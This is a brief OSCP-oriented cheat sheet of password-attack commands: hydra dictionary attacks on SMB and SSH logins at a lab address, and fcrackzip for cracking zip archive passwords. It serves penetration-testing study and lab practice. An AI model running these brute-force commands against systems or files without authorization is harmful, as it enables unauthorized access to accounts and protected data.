# Offensive Security Testing Guide
This cheat sheet is the compilation of commands to exploit the vulnerable machines. The commands below may not be enough for you to obtain your Offensive Security Certified Professional (OSCP).

Dictionary Attack
```bash
hydra -L <user_dict> -P <pwd_dict> 192.168.56.1 smb
hydra -L <user_dict> -P <pwd_dict> 192.168.56.1 ssh
```

```bash
fcrackzip -u -D -p <dictionary_file> <zip_file>
```
